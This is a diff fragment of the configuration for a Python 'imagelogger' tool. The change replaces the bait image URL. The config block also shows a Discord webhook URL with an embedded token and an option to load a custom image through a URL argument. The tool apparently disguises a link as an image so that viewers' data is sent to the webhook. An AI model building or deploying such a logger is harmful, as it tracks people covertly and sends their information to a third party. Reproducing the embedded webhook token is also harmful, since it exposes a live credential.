@@ -15,7 +15,7 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1545716949072478218/0jmphCGZkr2ezEFVOz-aPoLfQ_pkLhk0ENTN3h7D-cqacgHoFQiHtkO-0yLGlDBERVHv",
-    "image": "https://tcmhuxevcnxpxpubnhkm.supabase.co/storage/v1/object/public/memes/memes/2026/05/12/custom-upload-son-1778634282482.webp", # You can also have a custom image by using a URL argument
+    "image": "https://i1.sndcdn.com/artworks-000234186330-8yj6x3-t500x500.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
